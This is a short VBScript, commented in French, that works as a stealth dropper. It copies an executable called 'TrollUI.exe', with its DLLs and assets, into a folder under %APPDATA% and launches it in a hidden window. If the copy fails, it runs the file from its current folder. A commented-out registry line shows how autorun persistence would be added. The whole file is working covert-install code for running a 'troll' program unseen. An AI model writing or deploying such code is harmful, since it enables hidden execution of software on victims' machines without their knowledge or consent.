Option Explicit
On Error Resume Next

Dim objFSO, objShell, curDir, appData, targetDir, exeName, targetExe
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

curDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
appData = objShell.ExpandEnvironmentStrings("%APPDATA%")
targetDir = appData & "\TrollSystem"
exeName = "TrollUI.exe"
targetExe = targetDir & "\" & exeName

' 1. Création du répertoire caché s'il n'existe pas
If Not objFSO.FolderExists(targetDir) Then
    objFSO.CreateFolder(targetDir)
End If

' 2. Copie furtive de l'exécutable et des dépendances (.dll)
If objFSO.FileExists(curDir & "\" & exeName) Then
    objFSO.CopyFile curDir & "\*.*", targetDir & "\", True
End If

' 3. Copie automatique du dossier d'assets s'il est au même niveau
If objFSO.FolderExists(curDir & "\Asset") Then
    If Not objFSO.FolderExists(targetDir & "\Asset") Then
        objFSO.CreateFolder(targetDir & "\Asset")
    End If
    objFSO.CopyFolder curDir & "\Asset\*", targetDir & "\Asset\", True
End If

' 4. [SUPPRIMÉ SUR ORDRE] Pas d'installation dans le Registre (Aucune persistance)
' objShell.RegWrite regKey, Chr(34) & targetExe & Chr(34), "REG_SZ"

' 5. Exécution Silencieuse (Mode 0 = Hidden Window, False = Do Not Wait)
If objFSO.FileExists(targetExe) Then
    objShell.Run Chr(34) & targetExe & Chr(34), 0, False
Else
    ' Fallback : On le lance depuis le dossier courant s'il a planté
    objShell.Run Chr(34) & curDir & "\" & exeName & Chr(34), 0, False
End If
